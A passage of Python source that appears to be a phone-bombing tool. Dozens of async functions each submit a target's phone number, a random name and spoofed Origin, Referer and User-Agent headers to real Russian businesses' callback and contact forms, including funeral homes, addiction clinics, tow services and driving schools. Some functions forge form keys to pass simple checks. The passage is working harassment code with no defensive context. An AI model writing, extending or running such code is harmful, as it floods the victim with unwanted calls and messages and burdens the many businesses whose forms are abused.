    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Origin":"https://pskov.evakuatorok.ru","Referer":"https://pskov.evakuatorok.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_metalk_api(s, p):
    url = "https://widget.me-talk.ru/LAPI/me-talk/api.php"
    d = {"phone":p["digits_7"],"name":rn(),"action":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://me-talk.ru","Referer":"https://me-talk.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perevozka24(s, p):
    url = "https://perevozka24.com/offer/evakuatory?ajax=1"
    d = {"name":rn(),"phone":p["formatted"],"service":"Эвакуатор"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://perevozka24.com","Referer":"https://perevozka24.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_servisakpp(s, p):
    url = "https://pskov.servisakpp.ru/service/zamena-masla-v-akpp"
    d = {"name":rn(),"phone":p["formatted"],"service":"Замена масла в АКПП"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.servisakpp.ru","Referer":"https://pskov.servisakpp.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_prizyvanet_cf7(s, p):
    url = "https://prizyvanet.ru/wp-json/contact-form-7/v1/contact-forms/20254/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна юридическая консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://prizyvanet.ru","Referer":"https://prizyvanet.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_autoschool(s, p):
    url = "https://pskov.autoschool.dosaaf.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"category":random.choice(["A","B","C"])}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.autoschool.dosaaf.ru","Referer":"https://pskov.autoschool.dosaaf.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pdbg_fetchit(s, p):
    url = "https://pdbg.ru/assets/components/fetchit/action.php"
    d = {"phone":p["raw"],"name":rn(),"form_key":hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://pdbg.ru","Referer":"https://pdbg.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritualvechnostspb(s, p):
    url = "https://ritualvechnostspb.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":"Организация похорон"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://ritualvechnostspb.ru","Referer":"https://ritualvechnostspb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mos_ritual(s, p):
    url = "https://mos-ritual.su/form/contact?ajax_form=1&_wrapper_format=drupal_ajax"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Организация похорон"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mos-ritual.su","Referer":"https://mos-ritual.su/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_horonim(s, p):
    url = "https://www.horonim.ru/nm_forms/action.php"
    d = {"phone":p["raw"],"name":rn(),"form_id":"callback","agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.horonim.ru","Referer":"https://www.horonim.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gkrs_spb_sms(s, p):
    url = "https://gkrs-spb.ru/api/v1/sms/form/"
    d = {"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://gkrs-spb.ru","Referer":"https://gkrs-spb.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn52_ajaxchunk(s, p):
    url = "https://xn--52-8kc5aq1api.xn--p1ai/assets/components/ajaxchunk/connector.php"
    d = {"phone":p["raw"],"name":rn(),"form_key":hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://xn--52-8kc5aq1api.xn--p1ai","Referer":"https://xn--52-8kc5aq1api.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritual_voronezh(s, p):
    url = "https://ritual-voronezh.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://ritual-voronezh.ru","Referer":"https://ritual-voronezh.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avtogruz_spb(s, p):
    url = "https://avtogruz-spb.ru/ajax/v1rt-forms/vf-popup.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Грузоперевозки"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://avtogruz-spb.ru","Referer":"https://avtogruz-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gruso_perevozchik(s, p):
    url = "https://www.gruso-perevozchik.ru/_includes/zvonok.php"
    d = {"name":rn(),"phone":p["formatted"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.gruso-perevozchik.ru","Referer":"https://www.gruso-perevozchik.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tamozhennyy_broker(s, p):
    url = "https://tamozhennyy-broker.ru/zakazat-zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tamozhennyy-broker.ru","Referer":"https://tamozhennyy-broker.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sigma_trans(s, p):
    url = "https://www.sigma-trans.ru/call-back/"
    d = {"name":rn(),"phone":p["digits_7"],"time":"Сейчас"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.sigma-trans.ru","Referer":"https://www.sigma-trans.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kuda_vezti(s, p):
    url = "https://kuda-vezti.ru/zaprosit-obratnyj-zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://kuda-vezti.ru","Referer":"https://kuda-vezti.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_abstd_callback(s, p):
    url = "https://abstd.ru/header-send_callback"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://abstd.ru","Referer":"https://abstd.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_elephant_moving(s, p):
    url = "https://elephant-moving.ru/24-kruglosutochno/"
    d = {"name":rn(),"phone":p["formatted"],"service":"Переезд"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://elephant-moving.ru","Referer":"https://elephant-moving.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_comagic_v1(s, p):
    url = "https://server.comagic.ru/api/v1/"
    d = {"phone":p["digits_7"],"name":rn(),"callback_time":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://comagic.ru","Referer":"https://comagic.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_yartrans(s, p):
    url = "https://yartrans.ru/services/gruzoperevozki_ivanovo/"
    d = {"name":rn(),"phone":p["formatted"],"cargo":"Перевозка вещей"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://yartrans.ru","Referer":"https://yartrans.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_poleznoo_callback(s, p):
    url = "https://poleznoo.ru/index.php?route=extension/module/callback"
    d = {"name":rn(),"phone":p["formatted"],"comment":"Заказ обратного звонка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://poleznoo.ru","Referer":"https://poleznoo.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_oniks_clinic(s, p):
    url = "https://oniks-clinic.ru/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://oniks-clinic.ru","Referer":"https://oniks-clinic.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_psychiatr_clinic(s, p):
    url = "https://psychiatr.clinic/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":"Нужна консультация психиатра"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://psychiatr.clinic","Referer":"https://psychiatr.clinic/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_detox24(s, p):
    url = "https://detox24.ru/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":"Нужна детоксикация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://detox24.ru","Referer":"https://detox24.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perm_president_medical(s, p):
    url = "https://perm.president-medical.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://perm.president-medical.ru","Referer":"https://perm.president-medical.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_narkolog_express_add(s, p):
    url = "https://narkolog.express/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Вызов нарколога","f_Name":rn(),"f_Phone":p["raw"],"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://narkolog.express","Referer":"https://narkolog.express/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_triumf_center(s, p):
    url = "https://tomsk.triumf.center/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.triumf.center","Referer":"https://tomsk.triumf.center/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_stop_alko(s, p):
    url = "https://tomsk.stop-alko.com/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":"Нужен вывод из запоя"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.stop-alko.com","Referer":"https://tomsk.stop-alko.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sochi_metod_dovzhenko(s, p):
    url = "https://sochi.metod-dovzhenko.com/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":"Консультация по методу Довженко"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://sochi.metod-dovzhenko.com","Referer":"https://sochi.metod-dovzhenko.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sochiinsite_cf7(s, p):
    url = "https://sochiinsite.ru/wp-json/contact-form-7/v1/contact-forms/6049/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://sochiinsite.ru","Referer":"https://sochiinsite.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zapoy_sochi(s, p):
    url = "https://zapoy-sochi.ru/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":"Вывод из запоя"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://zapoy-sochi.ru","Referer":"https://zapoy-sochi.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stocrm_callback(s, p):
    url = "https://stocrm.ru/w/api/send_callback/"
    d = {"name":rn(),"phone":p["digits_7"],"time":"Сейчас"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://stocrm.ru","Referer":"https://stocrm.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stokoney_api(s, p):
    url = "https://stokoney.ru/api/orders"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"service":random.choice(SERV),"address":ra(),"comment":"Заказ услуги"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://stokoney.ru","Referer":"https://stokoney.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_autoprofi70(s, p):
    url = "https://autoprofi70.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","service":random.choice(AUTO_S),"car":f"{random.choice(CAR_B)} {random.choice(CAR_M)}"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://autoprofi70.ru","Referer":"https://autoprofi70.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_rmasla(s, p):
    url = "https://tomsk.rmasla.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","service":"Замена масла","car":f"{random.choice(CAR_B)} {random.choice(CAR_M)}"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.rmasla.ru","Referer":"https://tomsk.rmasla.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_santehniki(s, p):
    url = "https://petrozavodsk.san-tehniki.com/send-validate/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.san-tehniki.com","Referer":"https://petrozavodsk.san-tehniki.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_dmastera(s, p):
    url = "https://petrozavodsk.d-mastera.ru/wp-content/themes/d-mastera/callback/send/send.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.d-mastera.ru","Referer":"https://petrozavodsk.d-mastera.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_dmastera_cf7(s, p):
    url = "https://petrozavodsk.d-mastera.ru/wp-json/contact-form-7/v1/contact-forms/3197/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна помощь мастера"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.d-mastera.ru","Referer":"https://petrozavodsk.d-mastera.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santehnik_murmansk(s, p):
    url = "https://santehnik-murmansk.ru/lib/feedback/mail-form.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Сантехник","address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santehnik-murmansk.ru","Referer":"https://santehnik-murmansk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_esih_form(s, p):
    url = "https://esih.ru/form/action_form.php"
    d = {"name":rn(),"phone":p["formatted"],"email":re_(),"message":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://esih.ru","Referer":"https://esih.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_natpotolok(s, p):
    url = "https://murmansk.natpotolok.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://murmansk.natpotolok.ru","Referer":"https://murmansk.natpotolok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_slesarek(s, p):
    url = "https://murmansk.slesarek.ru/site/ajax-send"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(["Слесарные работы","Сантехник","Электрик"]),"address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://murmansk.slesarek.ru","Referer":"https://murmansk.slesarek.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_zamena_zamkov(s, p):
    url = "https://murmansk.zamena-zamkov.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Замена замков","address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://murmansk.zamena-zamkov.ru","Referer":"https://murmansk.zamena-zamkov.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_muzhnachas_murmansk(s, p):
    url = "https://muzhnachas-murmansk.ru/lib/feedback/mail-form.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Муж на час","address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://muzhnachas-murmansk.ru","Referer":"https://muzhnachas-murmansk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_mchs_zamkov24(s, p):
    url = "https://murmansk.mchs-zamkov24.ru/mail.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Замена замков"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://murmansk.mchs-zamkov24.ru","Referer":"https://murmansk.mchs-zamkov24.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_mishka_servis(s, p):
    url = "https://murmansk.mishka-servis.ru/zayavka.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV),"address":ra(),"comment":"Нужна помощь"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://murmansk.mishka-servis.ru","Referer":"https://murmansk.mishka-servis.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_profivdom(s, p):
    url = "https://murmansk.profivdom.ru/send-validate/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужен ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://murmansk.profivdom.ru","Referer":"https://murmansk.profivdom.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_murmansk_rukaster(s, p):
    url = "https://murmansk.rukaster.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":"Нужен мастер"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://murmansk.rukaster.ru","Referer":"https://murmansk.rukaster.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_master_220_callback(s, p):
    url = "https://master-220.ru/incluide/callback.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Электрик"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://master-220.ru","Referer":"https://master-220.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn7kcbanpdvcesbfcd5bb3cmmqigc3e5k(s, p):
    url = "https://xn-----7kcbanpdvcesbfcd5bb3cmmqigc3e5k.xn--p1ai/api/orderFormSend"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://xn-----7kcbanpdvcesbfcd5bb3cmmqigc3e5k.xn--p1ai","Referer":"https://xn-----7kcbanpdvcesbfcd5bb3cmmqigc3e5k.xn--p1ai/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vologda_masterabyta_cf7(s, p):
    url = "https://vologda.masterabyta.ru/wp-json/contact-form-7/v1/contact-forms/127/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен ремонт бытовой техники"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vologda.masterabyta.ru","Referer":"https://vologda.masterabyta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vologda_santechnici(s, p):
    url = "https://vologda.santechnici.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vologda.santechnici.ru","Referer":"https://vologda.santechnici.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vologda_fl99(s, p):
    url = "https://vologda.fl99.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vologda.fl99.ru","Referer":"https://vologda.fl99.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_komsis_su(s, p):
    url = "https://komsis.su/api/feedback/question/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"question":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://komsis.su","Referer":"https://komsis.su/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vologda_msremont(s, p):
    url = "https://vologda.msremont.ru/lib/feedback/mail-form.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV),"address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vologda.msremont.ru","Referer":"https://vologda.msremont.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_autoelectric_spb(s, p):
    url = "https://autoelectric-spb.ru/mail.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен автоэлектрик","car":f"{random.choice(CAR_B)} {random.choice(CAR_M)}"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://autoelectric-spb.ru","Referer":"https://autoelectric-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_auto_help78_cf7(s, p):
    url = "https://auto-help78.ru/wp-json/contact-form-7/v1/contact-forms/4/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":random.choice(AUTO_S)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://auto-help78.ru","Referer":"https://auto-help78.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_scady(s, p):
    url = "https://scady.ru/"
    d = {"name":rn(),"phone":p["formatted"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://scady.ru","Referer":"https://scady.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn51_avtoshkola(s, p):
    url = "https://www.xn--51-mlcla9aficvb.xn--p1ai/service/avtoshkola-prioritet?ajax_form=1&_wrapper_format=drupal_ajax"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.xn--51-mlcla9aficvb.xn--p1ai","Referer":"https://www.xn--51-mlcla9aficvb.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_chempionauto_cf7(s, p):
    url = "https://chempionauto.ru/wp-json/contact-form-7/v1/contact-forms/34323/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись в автошколу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://chempionauto.ru","Referer":"https://chempionauto.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avtoshkola_v_murino(s, p):
    url = "https://avtoshkola-v.ru/offices/murino/"
    d = {"name":rn(),"phone":p["digits_7"],"category":random.choice(["A","B","C"])}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://avtoshkola-v.ru","Referer":"https://avtoshkola-v.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_gsritual(s, p):
    url = "https://tomsk.gsritual.info/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://tomsk.gsritual.info","Referer":"https://tomsk.gsritual.info/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritual59(s, p):
    url = "https://ritual59.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Организация похорон"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ritual59.ru","Referer":"https://ritual59.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_ritual(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(100000000,999999999),"siteId":31364,"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://ritual59.ru","Referer":"https://ritual59.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perm_ritual_doverie(s, p):
    url = "https://perm.ritual-doverie.com/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ звонка","f_Name":rn(),"f_Phone":p["raw"],"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://perm.ritual-doverie.com","Referer":"https://perm.ritual-doverie.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_prk_perm(s, p):
    url = "https://prk-perm.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://prk-perm.ru","Referer":"https://prk-perm.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritualrating(s, p):
    url = "https://ritualrating.ru/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ritualrating.ru","Referer":"https://ritualrating.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_avtoshkola4kolesa_cf7(s, p):
